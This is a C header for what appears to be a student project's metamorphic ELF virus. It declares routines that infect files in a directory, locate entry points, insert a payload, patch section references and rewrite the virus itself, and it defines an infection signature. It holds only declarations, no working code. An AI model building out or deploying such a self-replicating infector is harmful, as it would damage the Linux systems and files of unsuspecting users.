/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   virus.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/27 01:49:28 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef VIRUS_H
# define VIRUS_H

# include <fcntl.h>
# include <linux/elf.h>
# include <stdbool.h>
# include <stdint.h>
# include <sys/types.h>
# include <unistd.h>

# include "accessors.h"

/*
** hardcoded signature for
** "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
*/

# define SIGNATURE_LEN		64
# define SIGNATURE_CKSUM	0x1526

/*
** entry point related informations
*/

struct				entry
{
	struct elf64_phdr	*safe_phdr;
	struct elf64_shdr	*safe_shdr;
	struct elf64_shdr	*safe_last_section_shdr;
	size_t			end_of_last_section;
	size_t			offset_in_section;
};

/*
** virus entry point and start routines
*/

void		virus(void);
void		infect_files_in(const char *path);
bool		infect(const char *file);
bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref);

/*
** infection engine routines
*/

bool		find_entry(struct entry *file_entry, struct safe_ptr ref);
bool		setup_payload(struct safe_ptr ref, const struct entry *clone_entry, uint64_t son_seed[2]);
bool		adjust_references(struct safe_ptr ref, size_t shift_amount, size_t end_of_last_section);
bool		copy_to_clone(struct safe_ptr clone_ref, struct safe_ptr original_ref, \
			size_t end_last_sect, size_t shift_amount, size_t original_size);
bool		metamorph_self(uint64_t son_seed[2], uint64_t client_id);

/*
** elf iterators
*/

typedef	bool	(*f_iter_callback)(struct safe_ptr ref, size_t offset, void *data);

bool		foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data);
bool		foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data);

/*
** end of virus (cf Makefile)
*/

void		_start(void);

#endif
